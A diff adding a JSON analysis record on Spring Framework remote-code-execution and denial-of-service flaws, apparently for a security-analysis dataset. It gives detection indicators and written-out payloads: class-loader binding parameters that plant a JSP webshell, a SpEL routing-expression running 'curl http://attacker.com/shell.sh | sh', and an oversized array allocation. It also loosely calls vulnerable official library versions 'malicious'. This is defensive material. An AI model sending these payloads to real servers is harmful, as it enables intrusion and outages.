@@ -1,0 +1,129 @@
+{
+  "package_info": {
+    "package_name": "org.springframework:spring-beans, org.springframework.cloud:spring-cloud-function-context, org.springframework:spring-expression",
+    "package_manager": "Maven (Java)",
+    "package_versions": "spring-beans <5.3.18, <5.2.20; spring-cloud-function-context <3.1.7, <3.2.3; spring-expression 5.3.0-5.3.16 and older",
+    "why_malicious": "These package versions contain critical vulnerabilities that allow remote code execution (RCE) and denial of service (DoS) via unsafe data binding and expression evaluation, enabling attackers to execute arbitrary code or exhaust system resources remotely."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "runtime (HTTP POST parameter binding)",
+        "file_location": "org/springframework/beans/CachedIntrospectionResults.java",
+        "required_permissions": [
+          "filesystem",
+          "network"
+        ]
+      },
+      "code_snippet": "POST /vulnerable-endpoint HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nclass.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7B...malicious%20JSP%20code...%7D\nclass.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp\nclass.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT\nclass.module.classLoader.resources.context.parent.pipeline.first.prefix=shell\nclass.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
+      "code_language": "HTTP/Java (data binding exploit)",
+      "code_behavior": "At runtime, the code binds attacker-supplied POST parameters to internal Java class properties, allowing arbitrary file write (JSP webshell) to the webroot, resulting in remote code execution.",
+      "malice_analysis": {
+        "why_suspicious": "Binding HTTP parameters to internal Java class loader properties is highly abnormal and enables attackers to manipulate application internals.",
+        "violated_expectations": "Normal data binding should only affect user-defined model objects, not core Java internals or class loader properties.",
+        "similar_legitimate_use": "Legitimate data binding is used for mapping form fields to POJOs, but never to core Java class internals.",
+        "key_indicators": [
+          "Access to class.module.classLoader via HTTP parameters",
+          "Ability to write arbitrary files (JSP) to webroot",
+          "No authentication or authorization required"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "runtime (function routing via HTTP headers)",
+        "file_location": "org/springframework/cloud/function/context/RoutingFunction.java",
+        "required_permissions": [
+          "filesystem",
+          "network"
+        ]
+      },
+      "code_snippet": "POST /functionRouter HTTP/1.1\nspring.cloud.function.routing-expression=T(java.lang.Runtime).getRuntime().exec('curl http://attacker.com/shell.sh | sh')",
+      "code_language": "HTTP/Java (SpEL injection)",
+      "code_behavior": "At runtime, the code evaluates attacker-supplied SpEL expressions from HTTP headers, allowing arbitrary command execution on the server.",
+      "malice_analysis": {
+        "why_suspicious": "Evaluating untrusted SpEL expressions from HTTP headers allows attackers to execute arbitrary code.",
+        "violated_expectations": "Only trusted, pre-defined expressions should be evaluated; user input should never be executed as code.",
+        "similar_legitimate_use": "SpEL is used for dynamic routing in trusted environments, but not with untrusted user input.",
+        "key_indicators": [
+          "SpEL expression injection via HTTP headers",
+          "Use of Runtime.exec in SpEL",
+          "No input validation or sanitization"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_3",
+      "execution_context": {
+        "trigger": "runtime (expression evaluation)",
+        "file_location": "org/springframework/expression/spel/ast/SpelNodeImpl.java (createArray method)",
+        "required_permissions": [
+          "memory"
+        ]
+      },
+      "code_snippet": "T(java.util.Arrays).copyOf(new int[2147483647], 2147483647)",
+      "code_language": "SpEL/Java",
+      "code_behavior": "At runtime, the code evaluates a SpEL expression that attempts to allocate a massive array, causing OutOfMemoryError and denial of service.",
+      "malice_analysis": {
+        "why_suspicious": "Allowing unbounded array creation from user input can exhaust system memory and crash the application.",
+        "violated_expectations": "Expression evaluation should enforce resource limits to prevent DoS.",
+        "similar_legitimate_use": "Array creation in SpEL is legitimate for small, controlled sizes.",
+        "key_indicators": [
+          "Unbounded array size in SpEL",
+          "No input validation on array size",
+          "Potential for OutOfMemoryError"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker sends specially crafted HTTP POST parameters or headers to the vulnerable endpoint.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_2",
+        "snippet_3"
+      ],
+      "leads_to": "Triggering unsafe data binding or expression evaluation."
+    },
+    {
+      "step": 2,
+      "action": "Vulnerable code binds parameters or evaluates expressions, allowing arbitrary file write, code execution, or resource exhaustion.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_2",
+        "snippet_3"
+      ],
+      "leads_to": "Remote code execution (RCE) or denial of service (DoS)."
+    },
+    {
+      "step": 3,
+      "action": "Attacker gains remote shell, executes arbitrary commands, or crashes the application.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_2",
+        "snippet_3"
+      ],
+      "leads_to": "System compromise or service outage (final goal)."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "HTTP POST parameters or headers referencing class.module.classLoader or SpEL expressions",
+      "Unexpected file creation in webroot (e.g., .jsp files)",
+      "Large memory allocation attempts via SpEL"
+    ],
+    "file_indicators": [
+      "webapps/ROOT/shell.jsp",
+      "suspicious .jsp files created at runtime"
+    ],
+    "network_indicators": [
+      "Outbound requests to attacker-controlled domains (e.g., via curl/wget in SpEL)",
+      "Unusual HTTP requests with SpEL expressions in headers"
+    ],
+    "how_to_detect": "Monitor HTTP requests for parameters or headers containing 'class.module.classLoader', 'spring.cloud.function.routing-expression', or large array allocations in SpEL. Watch for unexpected .jsp file creation in webroots and outbound network connections initiated by the application process. Use SCA tools to flag vulnerable Spring package versions."
+  }
+}
